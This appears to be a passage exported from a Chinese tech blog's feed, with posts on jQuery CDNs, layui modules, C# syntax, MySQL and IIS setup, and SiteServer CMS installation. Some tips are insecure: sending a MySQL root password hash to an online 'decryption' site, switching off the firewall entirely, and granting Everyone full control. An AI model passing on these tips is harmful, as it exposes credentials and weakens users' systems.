    <content type="html"><![CDATA[<p>jQuery是一个JavaScript函数库。</p><p>jQuery是一个轻量级的”写的少，做的多”的JavaScript库。</p><p>jQuery库包含以下功能：</p><ul><li>HTML 元素选取</li><li>HTML 元素操作</li><li>CSS 操作</li><li>HTML 事件函数</li><li>JavaScript 特效和动画</li><li>HTML DOM 遍历和修改</li><li>AJAX</li><li>Utilities</li></ul><p>1.使用 HTML 的 <script> 标签引用：</p><head> <script src="jquery-1.10.2.min.js"></script> </p><p>2.通过 CDN（内容分发网络） 引用</p><p>（1）Staticfile CDN：</p><head> <script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"> </script> </head><p>（2）百度 CDN:</p><head> <script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"> </script> </head><p>（3）又拍云 CDN:</p><head> <script src="https://upcdn.b0.upaiyun.com/libs/jquery/jquery-2.0.2.min.js"> </script> </head><p>（4）新浪 CDN:</p><head> <script src="https://lib.sinaapp.com/js/jquery/2.0.2/jquery-2.0.2.min.js"> </script> </head><p>（5）Google CDN:</p><head> <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"> </script> </head><p>（6）Microsoft CDN:</p><head> <script src="https://ajax.aspnetcdn.com/ajax/jquery/jquery-1.9.0.min.js"></script> </head><p>使用 Staticfile CDN、百度、又拍云、新浪、谷歌或微软的 jQuery，有一个很大的优势：</p><p>许多用户在访问其他站点时，已经从百度、又拍云、新浪、谷歌或微软加载过 jQuery。所以结果是，当他们访问您的站点时，会从缓存中加载 jQuery，这样可以减少加载时间。同时，大多数 CDN 都可以确保当用户向其请求文件时，会从离用户最近的服务器上返回响应，这样也可以提高加载速度。</p>]]></content>
    
    
    <categories>
      
      <category>jquery</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>layUI全局配置及定义模块</title>
    <link href="/2019/06/14/layui%E5%85%A8%E5%B1%80%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%AE%9A%E4%B9%89%E6%A8%A1%E5%9D%97/index/"/>
    <url>/2019/06/14/layui%E5%85%A8%E5%B1%80%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%AE%9A%E4%B9%89%E6%A8%A1%E5%9D%97/index/</url>
    
    <content type="html"><![CDATA[<p>方法：layui.config(options)</p><p>可以在使用模块之前，全局化配置一些参数：</p><ol><li>layui.config({</li><li>dir: ‘/res/layui/‘ //layui.js 所在路径（注意，如果是script单独引入layui.js，无需设定该参数。），一般情况下可以无视</li><li>,version: false //一般用于更新模块缓存，默认不开启。设为true即让浏览器不缓存。也可以设为一个固定的值，如：201610</li><li>,debug: false //用于开启调试模式，默认false，如果设为true，则JS模块的节点会保留在页面</li><li>,base: ‘’ //设定扩展的Layui模块的所在目录，一般用于外部模块扩展</li><li>});</li></ol><p>方法：layui.define([mods], callback)</p><p>通过该方法可定义一个 Layui模块。参数mods是可选的，用于声明该模块所依赖的模块。callback即为模块加载完毕的回调函数，它返回一个exports参数，用于输出该模块的接口。</p><ol><li><p>layui.define(function(exports){</p></li><li><p>//do something</p></li><li><p>exports(‘demo’, function(){</p></li><li><p>alert(‘Hello World!’);</p></li><li><p>});</p></li><li><p>});</p></li></ol><p>跟Requirejs最大不同的地方在于接口输出，exports是一个函数，它接受两个参数，第一个参数为模块名，第二个参数为模块接口，当你声明了上述的一个模块后，你就可以在外部使用了，demo就会注册到layui对象下，即可通过 layui.demo() 去执行该模块的接口。</p><p>你也可以在定义一个模块的时候，声明该模块所需的依赖，如：</p><ol><li><p>layui.define([‘layer’, ‘laypage’], function(exports){</p></li><li><p>//do something</p></li><li><p>exports(‘demo’, function(){</p></li><li><p>alert(‘Hello World!’);</p></li><li><p>});</p></li><li><p>});</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>layui</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LayUI非模块化用法</title>
    <link href="/2019/06/13/layui%E9%9D%9E%E6%A8%A1%E5%9D%97%E5%8C%96%E7%94%A8%E6%B3%95/index/"/>
    <url>/2019/06/13/layui%E9%9D%9E%E6%A8%A1%E5%9D%97%E5%8C%96%E7%94%A8%E6%B3%95/index/</url>
    
    <content type="html"><![CDATA[<p> layui.js 及所有模块单独打包合并成了一个完整的js文件，用的时候直接引入这一个文件即可，如：</p><ol><li><script src="../layui/layui.all.js"></script></li><li><script></li><li><p>;!function(){</p></li><li><p>//无需再执行layui.use()方法加载模块，直接使用即可</p></li><li><p>var form = layui.form</p></li><li><p>,layer = layui.layer;</p></li><li><p>//…</p></li><li><p>}();</p></li><li><p></script><p></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>layui</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LayUI模块化的用法</title>
    <link href="/2019/06/13/layui%E6%A8%A1%E5%9D%97%E5%8C%96%E7%9A%84%E7%94%A8%E6%B3%95/index/"/>
    <url>/2019/06/13/layui%E6%A8%A1%E5%9D%97%E5%8C%96%E7%9A%84%E7%94%A8%E6%B3%95/index/</url>
    
    <content type="html"><![CDATA[<p>建立一个入口文件，并通过 layui.use() 方式来加载该入口文件：</p><ol><li><script></li><li>layui.config({</li><li>base: ‘/res/js/modules/‘ //你存放新模块的目录，注意，不是layui的模块目录</li><li>}).use(‘index’); //加载入口</li><li></script></li></ol><p>上述的 index 即为你 /res/js/modules/ 目录下的 index.js，它的内容应该如下：</p><ol><li><p>/**</p></li><li><p>项目JS主入口</p></li><li><p>以依赖layui的layer和form模块为例</p></li><li><p>**/</p></li><li><p>layui.define([‘layer’, ‘form’], function(exports){</p></li><li><p>var layer = layui.layer</p></li><li><p>,form = layui.form;</p></li><li><p>layer.msg(‘Hello World’);</p></li><li><p>exports(‘index’, {}); //注意，这里是模块输出的核心，模块名必须和use时的模块名一致</p></li><li><p>});</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>layui</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>C#流程控制</title>
    <link href="/2019/06/12/c%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/index/"/>
    <url>/2019/06/12/c%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/index/</url>
    
    <content type="html"><![CDATA[<p>1.goto语句</p><p>C#允许给代码行加上标签，这样就可以使用goto 语句直接跳转到这些代码行上。该语句优缺点</p><p>并存。主要的优点是：这是控制什么时候执行哪些代码的一种简单方式。主要的缺点是：过多地使</p><p>用这个技巧将使代码晦涩难懂。</p><p>goto 语句的用法如下：</p><p>goto</p><p>标签用下述方式定义：</p><p>2.分支</p><p>分支是控制下一步要执行哪行代码的过程。要跳转到的代码行由某个条件语句来控制。这个条</p><p>件语句使用布尔逻辑，对测试值和一个或多个可能的值进行比较。</p><p>三元运算符</p><p>if 语句</p><p>switch 语句</p><p>未完待续。。。</p>]]></content>
    
    
    <categories>
      
      <category>c-2</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>4.名称空间</title>
    <link href="/2019/06/11/4-%E5%90%8D%E7%A7%B0%E7%A9%BA%E9%97%B4/index/"/>
    <url>/2019/06/11/4-%E5%90%8D%E7%A7%B0%E7%A9%BA%E9%97%B4/index/</url>
    
    <content type="html"><![CDATA[<p>C#中的类是利用命名空间组织起来的。命名空间提供了一种从逻辑上组织类的方式，防止命名冲突。</p><p>命名空间的作用就是组织类，，防止类名相同引起冲突，把它当成文件夹，，而类就是文件夹下的文件，我们在资源管理器里面要找到一个可以通过他的路径找到比如QQ的安装目录C:\Program Files\Tencent\QQ命名空间就是这个作用，方便我们找到相应的类来引用。。。命名空间用Using关键字引用</p><p> 命名空间声明</p><p>用namespace 关键字用于声明一个命名空间。此命名空间范围允许您组织代码并为您提供了创建全局唯一类型的方法。</p><p>namespace name</p><p>{</p><p>类型定义</p><p>}</p><p>其中：在命名空间中，可以声明类、接口、结构、枚举、委托 命名空间。</p><p>如果未显式声明命名空间，则会创建默认命名空间。该默认的命名空间（有时称为全局命名空间）。全局命名空间中的任何标识符都可用于命名的命名空间中。</p><p>命名空间声明可以作为顶级声明出现在编译单元中，当命名空间声明作为顶级声明出现在编译单元中时，该命名空间成为全局命名空间的一个成员。</p><p>命名空间声明出现在另一个命名空间声明内时，该内部命名空间就成为包含着它的外部命名空间的一个成员。</p><p>无论是何种情况，一个命名空间的名称在它所属的命名空间内必须是唯一的。命名空间隐式地为 public，而且在命名空间的声明中不能包含任何访问修饰符。</p><p>嵌套的命名空间</p><p>命名空间声明中声明命名空间，各命名空间用”.”分隔。</p><p>例如:</p><p>namespace N1.N2</p><p>{</p><p>class A {}</p><p>class B {}</p><p>}</p><p>在语义上等效于</p><p>namespace N1</p><p>{</p><p>namespace N2</p><p>{</p><p>class A {}</p><p>class B {}</p><p>}</p><p>}</p><p>引用类</p><p>引用一个类可以用完全限定名来限定引用类(类名前加上命名空间名)，以防止命名冲突。</p><p>using 指令来导入其他命名空间和类型的名称，直接地而不是通过限定名来引用它们。</p><p>Using指令</p><p>using 别名指令为一个命名空间或类型启用一个别名。</p><p>using 命名空间指令用于导入一个命名空间的类型成员。</p><p>(1) using 命名空间指令将一个命名空间中所包含的类型导入到编译单元或命名空间体中，从而可以直接使用这些被导入的类型的标识符而不必加上它们的限定名。</p><p>如：</p><p>namespace N1.N2</p><p>{</p><p>class A {}</p><p>}</p><p>namespace N3</p><p>{</p><p>using N1.N2;</p><p>class B</p><p>{</p><p>public static void Main()</p><p>{</p><p>A a=new A();</p><p>}</p><p>}</p><p>}</p><p>上面的示例中，在 N3 命名空间中N1.N2 的类型成员是直接可用的,不需要完全限定名.</p><p>(2)using 命名空间指令导入包含在给定命名空间中的类型，但要注意，它不导入嵌套的命名空间。</p><p>示例:</p><p>namespace N1.N2</p><p>{</p><p>class A {}</p><p>}</p><p>namespace N3</p><p>{</p><p>using N1;</p><p>class B</p><p>{</p><p>public static void Main()</p><p>{</p><p>A a=new A(); //错误，N1.N2命名空间中的类型没有导入到命名空间N3中</p><p>}</p><p>}</p><p>}</p><p>(3)using 命名空间指令导入的名称会被编译单元或命名空间体中具有相同名称的成员所隐藏。</p><p>例如：</p><p>namespace N1.N2</p><p>{</p><p>class A {}</p><p>class B {}</p><p>}</p><p>namespace N3</p><p>{</p><p>using N1.N2;</p><p>class A {}//N3.A</p><p>}</p><p>在 N3 命名空间中的A类与N1.N2命名空间中的A类名称相同,则N1.N2.A被N3.A隐藏，A 引用 N3.A 而不是 N1.N2.A。</p><p>(4)同一编译单元或命名空间体中的 using 命名空间指令导入多个命名空间时，如果它们所包含的类型中有重名的，则直接引用该名称就被认为是不明确的。</p><p>示例:</p><p>namespace N1</p><p>{</p><p>class A {}</p><p>}</p><p>namespace N2</p><p>{</p><p>class A {}</p><p>}</p><p>namespace N3</p><p>{</p><p>using N1;</p><p>using N2;</p><p>class B</p><p>{</p><p>public static void Main()</p><p>{</p><p>A a=new A()// 错误A类明确,要使用完全限定名</p><p>}</p><p>}</p><p>}</p><p>N1 和 N2 都包含一个成员 A，而由于 N3 将两者都导入，所以在 N3 中引用 A 会导致一个编译时错误名称冲突.</p><p>using 别名指令用于为一个命名空间或类型指定一个别名。</p><p>using 标识符 = 命名空间或类型名称 ;</p><p>例如：</p><p>namespace N1.N2</p><p>{</p><p>class A {}</p><p>}</p><p>namespace N3</p><p>{</p><p>using A = N1.N2.A;</p><p>class B: A {}</p><p>}</p><p>上面的示例中，在 N3 命名空间中，A 是 N1.N2.A 的别名，因此类 N3.B 从类 N1.N2.A 派生。通过为 N1.N2 创建别名 R 然后引用 R.A 可以得到同样的效果：</p><p>namespace N3</p><p>{</p><p>using R = N1.N2;</p><p>class B: R.A {}</p><p>}</p><p>using 别名指令中的别名在直接包含该 using 别名指令的编译单元或命名空间的声明空间内必须是唯一的。例如：</p><p>namespace N3</p><p>{</p><p>class A {}</p><p>}</p><p>namespace N3</p><p>{</p><p>using A = N1.N2.A; // 错误,命名冲突</p><p>}</p><p>上例中，N3 已包含了成员 A，因此 using 别名指令使用 A 作标识符会导致一个编译时错误。</p>]]></content>
    
    
    <categories>
      
      <category>c-2</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>3.C#运算符</title>
    <link href="/2019/06/10/3-c%E8%BF%90%E7%AE%97%E7%AC%A6/index/"/>
    <url>/2019/06/10/3-c%E8%BF%90%E7%AE%97%E7%AC%A6/index/</url>
    
    <content type="html"><![CDATA[<p>运算符大致分为如下3 类。</p><p>一元运算符，处理一个操作数</p><p>二元运算符，处理两个操作数</p><p>三元运算符，处理三个操作数</p><p>数学运算符：</p><p>运算符 类别 示例表达式 结果</p><p>+ 二元 var1 = var2 + var3; var1 的值是var2 与var3 的和</p><p>- 二元 var1 = var2 - var3; var1 的值是var2 减去var3 所得的值</p><p>* 二元 var1 = var2 * var3; var1 的值是var2 与var3 的乘积</p><p>/ 二元 var1 = var2 / var3; var1 是var2 除以var3 所得的值</p><p>% 二元 var1 = var2 % var3; var1 是var2 除以var3 所得的余数</p><p>+ 一元 var1 = +var2; var1 的值等于var2 的值</p><p>- 一元 var1 = -var2; var1 的值等于var2 的值乘以-1</p><p>+(一元)运算符不会把值变成正的：如果var2是-1，则+var2 仍是-1</p><p>递增递减运算符</p><p>运算符 类别 示例表达式 结果</p><p>++ 一元 var1 = ++var2; var1 的值是var2 + 1，var2 递增1</p><p>-- 一元 var1 = –var2; var1 的值是var2 - 1，var2 递减1</p><p>++ 一元 var1 = var2++; var1 的值是var2，var2 递增1</p><p>-- 一元 var1 = var2–; var1 的值是var2，var2 递减1</p><p><img src="images/clipboard-300x86.png"></p>]]></content>
    
    
    <categories>
      
      <category>c-2</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2.C#变量</title>
    <link href="/2019/06/09/2-c%E5%8F%98%E9%87%8F/index/"/>
    <url>/2019/06/09/2-c%E5%8F%98%E9%87%8F/index/</url>
    
    <content type="html"><![CDATA[<p>声明变量：</p><p>类型 别名 允许值</p><p>sbyte System.SByte 在–128～127 之间的整数</p><p>byte System.Byte 在0～255 之间的整数</p><p>short System.Int16 在–32768～32767 之间的整数</p><p>ushort System.UInt16 在0～65535 之间的整数</p><p>int System.Int32 在–2147483648～2147483647 之间的整数</p><p>uint System.UInt32 在0～4294967295 之间的整数</p><p>long System.Int64 在–9223372036854775808～9223372036854775807 之间的整数</p><p>ulong System.UInt64 在0～18446744073709551615 之间的整数</p><p>变量名称加“u”表示不能在这些类型的变量中存储负数</p><p>浮点类型：float double decimal</p><p>类型 别名 允许的值</p><p>char System.Char 一个Unicode 字符，存储0～65535 之间的整数</p><p>bool System.Boolean 布尔值，true 或false</p><p>string System.String 一组字符</p><p>注意：组成string 的字符数没有上限，因为它可以使用可变大小的内存</p><p>变量命名规则：变量名的第一个字符必须是字母、下划线(_)或@。</p><p>其后的字符可以是字母、下划线或数字。</p><p>命名约定：PascalCase 和camelCase</p><p>在名称中使用的大小写表示它们的用途。它们都应用到由多个单词组成的名称中，并指定名称中的每个单词除了第一个字母大写外，其余字母都是小写。在camelCase 规则中，还有一个规则，即第一个</p><p>单词以小写字母开头</p><p>Microsoft 建议：对于简单的变量，使用camelCase 规则，而对于比较高级的命名则使用</p><p>PascalCase。</p><p>字面值：</p><p>类型 类别 后缀 示例/允许的值</p><p>bool 布尔 无 true 或false</p><p>int, uint, long, ulong 整数 无 100</p><p>uint, ulong 整数 u 或U 100U</p><p>long, ulong 整数 l 或L 100L</p><p>ulong 整数 ul、uL、Ul、UL、lu、lU、Lu 或LU 100UL</p><p>float 实数 f 或F 1.5F</p><p>double 实数 无、d 或D 1.5</p><p>decimal 实数 m 或M 1.5M</p><p>char 字符 无 ‘a’或转义序列</p><p>string 字符串 无 “a…a”，可以包含转 yi序列</p><p>字符串的字面值：</p><p>转义序列 产生的字符 字符的Unicode 值</p><p>\‘ 单引号 0x0027</p><p>\“ 双引号 0x0022</p><p>\\ 反斜杠 0x005C</p><p>\0 空 0x0000</p><p>\a 警告(产生蜂鸣) 0x0007</p><p>\b 退格 0x0008</p><p>\f 换页 0x000C</p><p>\n 换行 0x000A</p><p>\r 回车 0x000D</p><p>\t 水平制表符 0x0009</p><p>\v 垂直制表符 0x000B</p>]]></content>
    
    
    <categories>
      
      <category>c-2</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>1.C#的基本语法</title>
    <link href="/2019/06/08/1-c%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/index/"/>
    <url>/2019/06/08/1-c%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/index/</url>
    
    <content type="html"><![CDATA[<p>C#编译器不考虑代码中的空格、回车符或tab 字符</p><p>C#代码由一系列语句组成，每个语句部用个分号来结束。因为空白被忽略，所以一行可以有多</p><p>个语句，但从可读性的角度来看，通常在分号的后面加上回车符，这样就不会在一行上放置多个语</p><p>句了。但语句放在多个行上是可以的</p><p>C#是一种块结构的语言，所有的语句都是代码块的一部分。这些块用花括号来界定(“{”和“}”)，</p><p>代码块可以包含任意多行语句，或者根本不包含语句</p><p>注释方式：//注释一行</p><p>/*注释到*/</p>]]></content>
    
    
    <categories>
      
      <category>c-2</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Can&#39;t connect to MySQL server on &#39;localhost&#39; (10061)（一个蠢到爆的问题）</title>
    <link href="/2019/06/02/cant-connect-to-mysql-server-on-localhost-10061%EF%BC%88%E4%B8%80%E4%B8%AA%E8%A0%A2%E5%88%B0%E7%88%86%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%89/index/"/>
    <url>/2019/06/02/cant-connect-to-mysql-server-on-localhost-10061%EF%BC%88%E4%B8%80%E4%B8%AA%E8%A0%A2%E5%88%B0%E7%88%86%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%89/index/</url>
    
    <content type="html"><![CDATA[<p>今天在搭建SiteServer CMS时突然连不上mysql数据库，提示信息：Can’t connect to MySQL server on ‘localhost’ (10061)。。。没动过怎么会出问题呢，Google是个好东西，原来是MySQL服务没开。。。这么简单的问题，真的是脑子瓦特了。</p><p>解决办法：打开cmd-&gt;net start mysql 回车，搞定。</p><p>完美！</p>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>IIS  HTTP 错误 403（来自一个被沙雕回答支配一个多小时的可怜孩子的总结）</title>
    <link href="/2019/06/02/iis-http-%E9%94%99%E8%AF%AF-403-14/index/"/>
    <url>/2019/06/02/iis-http-%E9%94%99%E8%AF%AF-403-14/index/</url>
    
    <content type="html"><![CDATA[<p>使用 IIS 管理器启用目录浏览打开 IIS 管理器，在“功能”视图中，双击“目录浏览”，在“目录浏览”页上，在“操作”窗格中单击“启用”。</p><p>没错，网上的沙雕们就是这么说的，那你在浏览器里打开了之后是不是就是一个目录呢？？然后良心一点的沙雕就又说了：“在IIS中的站点属性的“文档”选项中启用默认文档，将您的主页文档加入其中。”，那你要是好几个同名字的文件呢，iis自己猜？？？</p><p>真正良心的回答来了，打开Web.config，里面有这么个东西：</p><p><code>&lt;system.webServer&gt; &lt;modules runAllManagedModulesForAllRequests=&quot;true&quot; /&gt; &lt;/system.webServer&gt;</code></p><p>照着改就完了。</p><p>还有“</p><p><code>&lt;directoryBrowse enabled=&quot;true&quot; /&gt;</code></p><p>”这么一条命令，它的下面有这么个东西：</p><p><code>&lt;defaultDocument&gt; &lt;files&gt; &lt;clear /&gt; &lt;add value=&quot;aaa/index.html&quot; /&gt; &lt;add value=&quot;Default.htm&quot; /&gt; &lt;add value=&quot;Default.asp&quot; /&gt; &lt;add value=&quot;index.htm&quot; /&gt; &lt;add value=&quot;iisstart.htm&quot; /&gt; &lt;add value=&quot;default.aspx&quot; /&gt; &lt;/files&gt; &lt;/defaultDocument&gt;</code>，改它，那个<code>&lt;add&gt;</code>第一个那个就是你设置的优先级最高的默认文档给它个路径，ok，搞定（自己搞出来的，如果有哪里错了，欢迎指正，谢谢）</p><p>最后：那些个瞎说的沙雕们啊，真的是，我都不知道怎么说好了，误人子弟。he，tui！</p>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SiteSever（.NET CMS）安装</title>
    <link href="/2019/06/02/sitesever%EF%BC%88-net-cms%EF%BC%89%E5%AE%89%E8%A3%85/index/"/>
    <url>/2019/06/02/sitesever%EF%BC%88-net-cms%EF%BC%89%E5%AE%89%E8%A3%85/index/</url>
    
    <content type="html"><![CDATA[<p>SiteSever介绍：.NET平台的CMS系统，也是一款拥有十年历史与广泛知名度的CMS系统，2017年5月初迈出了自成立以来的最具跨越性的一步，宣布开源并推出全新5.0版本.</p><p>安装过程：</p><p>1、下载SiteServer CMS系统安装包</p><p>    官网:<a href="https://www.siteserver.cn/">https://www.siteserver.cn</a> 下载后解压到一个自己想要安装的位置</p><p>注意：后面IIS配置站点时，需要把网站物理路径指向这里</p><p>2、新建空数据库（以MySQL为例）</p><p>    打开数据库可视化工具，填写连接数据库用的账号和密码，如果数据库是安装在本机，则服务器名称填写一个 127.0.0.1 即可。右键数据库连接名，选择新建数据库，添加想要建立的数据库名称，点击确定即可。</p><p>3、新建IIS站点</p><p>    进入：控制面板—&gt;系统和安全—&gt;管理工具，双击 “Internet 信息服务(IIS)管理器” ，启动IIS管理器</p><p>    选中 “网站” ，然后鼠标右键选择 “添加网站” 进到添加网站界面；网站名称： 随便填写一个； 应用程序池： 默认和站点同名；物理路径：需要填写成刚才在第一步解压安装包所在物理路径； 端口： 填写一个不小于1024且未被占用的端口即可，点击确定网站创建成功。然后需要设置一下应用程序池，鼠标双击刚建立的网站，弹出应用程序池设置界面，.Net Framework版本：一定要选择4.0.xxx（安装.Net Framework时一定要安装4.5.2或以上版本，但安装完在这显示为4.0.xxx）； 托管管道模式： 一定要选择集成模式；</p><p>4、运行SiteServer CMS安装程序</p><p>    打开浏览器，浏览器地址栏输入：” <a href="http://localhost:刚建立的网站端口/siteserver/&quot;">http://localhost:刚建立的网站端口/siteserver/&quot;</a> ，回车之后进入SiteServer CMS安装界面。</p><p>    点击继续，进入环境检测界面,如果提示读写权限不够的话赋予网站根目录相应权限: 1、打开IIS，选中相应站点名称；2、右键弹出菜单，选择“编辑权限”，切换到“安全”选项卡； 3、点“编辑” –&gt; “添加” –&gt; “高级” –&gt; “立即查找”； 4、选中IIS_IUSER和NETWORK_SERVICE，点“确定”； 5、在退回到“编辑”界面时，如下图所示，需要对刚才添加两个用户别赋予“完全控制”权限；</p><p>    环境检测通过之后，点击下一步按钮进入 “数据库设置” 界面,数据库主机:如果数据库软件是安装在本机，则填写 “(local)” 即可，否则需要填写数据库服务器的IP； 数据库端口： 一般选择默认数据库端口即可，如果数据库软件默认端口被修改了，则需要选择自定义端口，然后填写修改后的端口值；用户可以填写root用户，或者新建一个用户，若是忘记密码可以新建查询：select authentication_string from user where User=’root’;出来的结果是一个加密后的字符串，请自行百度，关键词：mysql在线解密，把字符串填进去，点解密即可。</p><p>   选择完了数据库之后，点击下一步，进入 “设置管理员帐号” 界面，此帐号属于SiteServer CMS系统最高级别权限，所以帐号密码尽可能设置复杂一些，剩下的自行设置，然后点击下一步，成功安装。</p>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>IIS搭建</title>
    <link href="/2019/05/30/iis%E6%90%AD%E5%BB%BA/index/"/>
    <url>/2019/05/30/iis%E6%90%AD%E5%BB%BA/index/</url>
    
    <content type="html"><![CDATA[<p>Windows桌面版搭建：</p><p>1.进入Windows的“控制面板</p><p>2.进入“程序”，然后点“启用或关闭Windows功能”</p><p>3.Internet Information Services 勾选</p><p>4.建议按照把“应用程序开发功能”中的内容全部勾选，要不IIS搭好以后只能挂HTML这种静态网页。勾选完成后，如还需要其他方面的功能，如ODBC日志、动态内容压缩、HTTP重定向等功能，也可以再次勾选，当然现在不勾选以后再加也没问题。</p><p>5.完成后，点击确定，Windows自动安装IIS功能，安装完成后，建议在“系统和安全”中，完全关闭防火墙，保证IIS的其他端口可被访问，在浏览器中，打开<a href="http://localhost,出现以下界面,则说明搭建成功/">http://localhost，出现以下界面，则说明搭建成功</a></p><p><img src="images/20190515093-300x154.jpg"></p><p>Windows Server搭建：</p><p>1.打开“服务器管理器”，在右上角找到“管理”-&gt;“添加角色和功能”</p><p>2.一直点击“下一步”，直到“服务器角色”一项，在右侧列表中找到“Web 服务器(IIS)”一项</p><p>3.成功添加角色后，会提示你选择所需的功能，类似前面Windows 桌面版的介绍，选择自己所需的功能，推荐将“应用程序开发”中的所有选项全部勾选！如果作为真正的服务器使用，最好把功能全部配齐，省得再次配置。勾选完后，一路“下一步”等待安装完成即可。</p><p>安装完成后，查看Windows服务，可以发现多出一项名为“World Wide Web Publishing Service”的服务，这个服务用于启动和管理IIS进程，保证Windows开机启动时，自动运行，而不需要某一个用户登录。</p>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>IIS配置教程</title>
    <link href="/2019/05/30/iis%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/index/"/>
    <url>/2019/05/30/iis%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/index/</url>
    
    <content type="html"><![CDATA[<p><strong>1.设置网站路径和端口</strong></p><p>首先，假设我们的网站已经在VS中完全开发完成</p><p>有两种方式整理网站需要的文件，第一是自己手动去复制，第二是用VS自动打包。</p><p>把这些文件复制到你需要挂网站的地方，如果是服务器系统，只要不是系统目录，你可以任意放，如果是桌面版系统，别放在桌面上、系统目录就行，推荐放在以下几种路径：</p><p>第一，IIS默认路径，C:\inetpub\wwwroot\</p><p>第二，非C盘的其他路径，如D:\xxx</p><p>第三，非网络路径的其他可读写、脚本可执行路径</p><p>接着，我们要在IIS里进行网站路径设置。打开IIS，在左边的列表中看到“网站”一项，如图所示，这里列出了所有在本机IIS服务器上挂载的站点</p><p><img src="images/2014051509045628.png"></p><p><img src="images/2014051509045628.png"></p><p>现在要考虑是将网站挂在本机的另一个TCP端口（Default Web Site默认绑定80端口，可以将自己的网站挂在8080等端口上）上，还是将网站挂在80端口下的一个虚拟目录中</p><p>首先，如果我们将网站挂在8080端口上，我们需要在“网站”中新建一个网站，大致操作为：右键“网站”-&gt;“添加网站”-&gt;输入信息 -&gt;点击“确定”即可，其中，“网站名称”任意填写，“物理路径”选择上面放了网站相关文件的目录路径，剩下端口改为8080或者其他未占用端口都 行，点击确定，访问<a href="http://localhost:8080/%E6%88%96%E8%80%85IP%E5%9C%B0%E5%9D%80%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BD%91%E7%AB%99%E4%BA%86">http://localhost:8080/或者IP地址即可看到自己的网站了</a></p><p>其次，我们来看一下虚拟路径的添加方法，所谓虚拟路径，就是类似<a href="http://www.xiyoumobile.com/admin/%E7%AD%89%E8%AE%BF%E9%97%AE%E6%96%B9%E6%B3%95%EF%BC%8C">http://www.xiyoumobile.com/admin/等访问方法，</a> 看似访问了网站中的另一个文件夹，实际上访问了另外一个网站，在IIS中可以选择“添加虚拟目录”和“添加应用程序”两种方法实现，个人推荐后者，因为不 用因为新建一个虚拟目录而考虑.dll文件的放置位置。具体操作：对着要添加虚拟目录的网站右键-&gt;”添加应用程序”-&gt;填写“别名”和“路 径”-&gt;确定，在<a href="http://www.2cto.com/os/liulanqi/">浏览器</a>中输入网站即可访问到网站，其中，“别名”请填写希望被访问的虚拟目录名，如<a href="http://www.xiyoumobile.com/admin/%E4%B8%AD%EF%BC%8C%E5%88%AB%E5%90%8D%E5%B0%B1%E5%BA%94%E8%AF%A5%E5%A1%AB%E2%80%9Cadmin%E2%80%9D%EF%BC%8C%E8%80%8C%E2%80%9C%E8%B7%AF%E5%BE%84%E2%80%9D%E5%88%99%E6%8C%89%E7%85%A7%E6%96%B0%E5%BB%BA%E7%BD%91%E7%AB%99%E7%9A%84%E6%96%B9%E6%B3%95%E5%A1%AB%E5%86%99%E5%8D%B3%E5%8F%AF">http://www.xiyoumobile.com/admin/中，别名就应该填“admin”，而“路径”则按照新建网站的方法填写即可</a></p><p><strong>2.设置权限</strong></p><p>Windows NT系统出于安全性的考虑，设置了用户组和权限的划分，尤其在普通桌面版或者说家庭版的系统中体现的更为明显，服务器上经常对Administrator 赋予了最高权限。搭建完成服务器了以后，Web页面能打开，但是会报错，500或者401等等，基本上是因为权限，如果401 就是压根儿啥权限都没有，500有可能是在写本地<a href="http://www.2cto.com/database/">数据库</a>的时候，文件禁止写入所造成的服务器错误，于是乎，就请仔细查看网站目录的权限是否给够了。</p><p>查看方法：</p><p>打开IIS，在左边的列表中选择一个网站或者虚拟目录，然后在右边的“操作”一栏中，选择“编辑权限”-&gt;“安全”</p><p>在这里可以看到，我的网站目录权限中有“Everyone”、“Authenticated Users”、“SYSTEM”、“Administrators”等几个用户组或者用户名，并允许“Everyone”用户组进行读取和执行、列出等操 作，所以网站的脚本、内容都是允许任何人进行访问或者说获取的，有些没有设置过权限，有可能就没有Everyone的这个权限，所以有可能访 问出现如下情况：</p><p><img src="images/2014051509045838.jpg"><img src="images/20190515092-300x236.jpg"></p><p><img src="images/2019051509-300x212.jpg"></p><p>这就是由于权限不够而造成访问失败</p><p>遇到这种情况就可以在“安全”中，添加Everyone或者IIS_IUSRS访问权限，如果需要文件上传，可以将某个文件夹设为可读可写可执行，只要在需要的权限上打上勾即可</p><p><strong>3.设置杂项</strong></p><p>配置成功后会出现如下错误：</p><p><img src="images/2014051509045840.jpg"><img 